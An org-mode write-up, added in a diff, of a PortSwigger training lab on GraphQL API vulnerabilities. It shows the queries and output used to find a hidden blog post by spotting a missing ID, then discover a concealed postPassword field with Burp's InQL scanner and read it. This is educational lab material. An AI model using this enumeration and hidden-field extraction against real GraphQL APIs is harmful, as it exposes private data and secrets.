@@ -1,0 +1,83 @@
+#+title: Accessing private Graphql posts
+#+author: [[https://github.com/touhidulshawan][Touhidul Shawan]]
+#+description: Graphql API Vulnerabilities Labs from Portswigger
+#+date: 2023-10-16 Mon
+#+options: toc:2
+
+* Table of Contents :toc:
+- [[#lab-contain][Lab contain]]
+- [[#end-goal][End Goal]]
+- [[#exploit][Exploit]]
+
+* Lab contain
+- contain a hidden blog post that has a secret password
+* End Goal
+- access to hidden blog post to fetch secret password and submit as the answer
+* Exploit
+- Access the lab
+- Make sure to install inql extension on burp to make this easier
+- Find the graphql endpoint
+  - Find two point =/graphql/v1=
+   #+begin_src graphql
+     query getBlogSummaries {
+         getAllBlogPosts {
+             image
+             title
+             summary
+             id
+         }
+     }
+#+end_src
+- This endpoint fetch all the blog post
+#+begin_src json
+  I just delete image & summary result
+  {
+    "data": {
+      "getAllBlogPosts": [
+        {
+          "title": "The Lies People Tell",
+          "id": 5
+        },
+        {
+          "title": "Finding Inspiration",
+          "id": 4
+        },
+        {
+          "title": "Festivals",
+          "id": 1
+        },
+        {
+          "title": "Trying To Save The World",
+          "id": 2
+        }
+      ]
+    }
+  }
+#+end_src
+- Here we can see that id =3= is missing. So we figured out that id =3= is our hidden post
+- Now find out endpoint for single blog post. Click on any =view post= button to get the request
+ #+begin_src graphql
+   query getBlogPost($id: Int!) {
+       getBlogPost(id: $id) {
+           image
+           title
+           author
+           date
+           paragraphs
+       }
+   }
+#+end_src
+- User scanner on InQL to findout more fields. And see that for this endpoint it has =postPassword= field
+ #+begin_src graphql
+   query getBlogPost($id: Int!) {
+     getBlogPost(id: $id) {
+       image
+       title
+       author
+       date
+       paragraphs
+       postPassword
+     }
+   }
+#+end_src
+- Send the request. It will return data with =postPassword= value. Copy and submit as answer to solve the lab
